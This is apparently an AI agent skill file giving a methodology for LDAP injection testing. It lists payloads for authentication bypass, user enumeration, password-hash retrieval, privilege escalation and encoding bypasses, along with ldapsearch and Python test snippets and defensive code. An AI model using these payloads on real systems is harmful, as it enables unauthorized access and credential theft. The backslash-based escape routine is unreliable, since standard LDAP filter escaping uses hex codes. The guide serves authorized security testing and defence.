---
name: ldap-injection-testing
description: Professional methodology and practical checks for LDAP injection testing.
version: 1.0.0
---

# LDAP Injection Vulnerability Testing

## Overview

LDAP injection is similar to SQL injection. It abuses flaws in LDAP query construction and may lead to information disclosure, authorization bypass, and related impacts. This skill provides methods for detecting, exploiting, and preventing LDAP injection.

## Vulnerability Principle

The application concatenates user input directly into LDAP queries without sufficient validation or filtering, allowing an attacker to modify the query logic.

**Dangerous code example:**
```java
String filter = "(&(cn=" + userInput + ")(userPassword=" + password + "))";
ldapContext.search(baseDN, filter, ...);
```

## LDAP Basics

### Query syntax

**Basic queries:**
```
(cn=John)
(objectClass=person)
(&(cn=John)(mail=john@example.com))
(|(cn=John)(cn=Jane))
(!(cn=John))
```

### Special characters

**Characters that must be escaped:**
- `(` `)` - parentheses
- `*` - wildcard
- `\` - escape character
- `/` - path separator
- `NUL` - null character

## Testing Methods

### 1. Identify LDAP input points

**Common features:**
- User login
- User search
- Directory browsing
- Permission validation

### 2. Basic detection

**Test special characters:**
```
*)(&
*)(|
*))(
*))%00
```

**Test logical operators:**
```
*)(&(cn=*
*)(|(cn=*
*))(!(cn=*
```

### 3. Authentication bypass

**Basic bypass:**
```
Username: *)(&
Password: *
Query: (&(cn=*)(&)(userPassword=*))
```

**More precise bypass:**
```
Username: admin)(&(cn=admin
Password: *))
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

### 4. Information disclosure

**Enumerate users:**
```
*)(cn=*
*)(uid=*
*)(mail=*
```

**Retrieve attributes:**
```
*)(|(cn=*)(userPassword=*
*)(|(objectClass=*)(cn=*
```

## Exploitation Techniques

### Authentication bypass

**Method 1: logical bypass**
```
Input: *)(&
Query: (&(cn=*)(&)(userPassword=*))
Result: matches all users
```

**Method 2: comment-style bypass**
```
Input: admin)(&(cn=admin
Query: (&(cn=admin)(&(cn=admin)(userPassword=*)))
```

**Method 3: wildcard**
```
Input: *)(|(cn=*)(userPassword=*
Query: (&(cn=*)(|(cn=*)(userPassword=*)(userPassword=*))
```

### Information disclosure

**Enumerate all users:**
```
Search: *)(cn=*
Result: returns all cn attributes
```

**Retrieve password hashes:**
```
Search: *)(|(cn=*)(userPassword=*
Result: returns users and password hashes
```

**Retrieve sensitive attributes:**
```
Search: *)(|(cn=*)(mail=*)(telephoneNumber=*
Result: returns multiple sensitive attributes
```

### Privilege escalation

**Modify query logic:**
```
Original: (&(cn=user)(memberOf=CN=Users,DC=example,DC=com))
Injection: user)(memberOf=CN=Admins,DC=example,DC=com))(|(cn=user
Result: may bypass permission checks
```

## Bypass Techniques

### Encoding bypass

**URL encoding:**
```
*)(& -> %2A%29%28%26
*)(| -> %2A%29%28%7C
```

**Unicode encoding:**
```
* -> \u002A
( -> \u0028
) -> \u0029
```

### Comment-style bypass

**Use malformed trailing logic:**
```
*)(&(cn=*
*)(|(cn=*
```

### Null-character injection

**Use a NULL byte:**
```
*))%00
```

## Tool Usage

### JXplorer

**Graphical LDAP client:**
- Connect to the LDAP server.
- Browse the directory structure.
- Execute query tests.

### ldapsearch

```bash
# Basic query
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"

# Test injection
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)(&"
```

### Burp Suite

1. Intercept requests that trigger LDAP queries.
2. Modify query parameters.
3. Observe response results.

### Python script

```python
import ldap3

server = ldap3.Server('ldap://target.com')
conn = ldap3.Connection(server, authentication=ldap3.SIMPLE,
                        user='cn=admin,dc=example,dc=com',
                        password='password')

# Test injection
filter_str = '*)(&'
conn.search('dc=example,dc=com', filter_str)
print(conn.entries)
```

## Verification and Reporting

### Verification steps

1. Confirm that the LDAP query can be controlled.
2. Verify authentication bypass or information disclosure.
3. Assess impact, such as unauthorized access or data leakage.
4. Record a complete proof of concept.

### Reporting points

- Vulnerable location and input parameter
- LDAP query construction method
- Complete exploitation steps and PoC
- Remediation advice, such as input validation and parameterized queries

## Defensive Measures

### Recommended approaches

1. **Input validation**
   ```java
   private static final String[] LDAP_ESCAPE_CHARS =
       {"\\", "*", "(", ")", "\0", "/"};

   public static String escapeLDAP(String input) {
       if (input == null) {
         return null;
       }
       StringBuilder sb = new StringBuilder();
       for (int i = 0; i < input.length(); i++) {
         char c = input.charAt(i);
         if (Arrays.asList(LDAP_ESCAPE_CHARS).contains(String.valueOf(c))) {
           sb.append("\\");
         }
         sb.append(c);
       }
       return sb.toString();
   }
   ```

2. **Parameterized queries**
   ```java
   // Use the LDAP API's parameterized support
   String filter = "(&(cn={0})(userPassword={1}))";
   Object[] args = {escapedCN, escapedPassword};
   // Build the query through the API
   ```

3. **Allowlist validation**
   ```java
   // Allow only specific characters
   if (!input.matches("^[a-zA-Z0-9@._-]+$")) {
       throw new IllegalArgumentException("Invalid input");
   }
   ```

4. **Least privilege**
   - Use a least-privileged account for LDAP connections.
   - Restrict queryable attributes.
   - Use access control lists.

5. **Error handling**
   - Do not return detailed error messages.
   - Use unified error responses.
   - Log errors.

## Notes

- Test only in authorized environments.
- Account for syntax differences between LDAP servers.
- Avoid impacting the directory during testing.
- Understand the target LDAP server configuration.
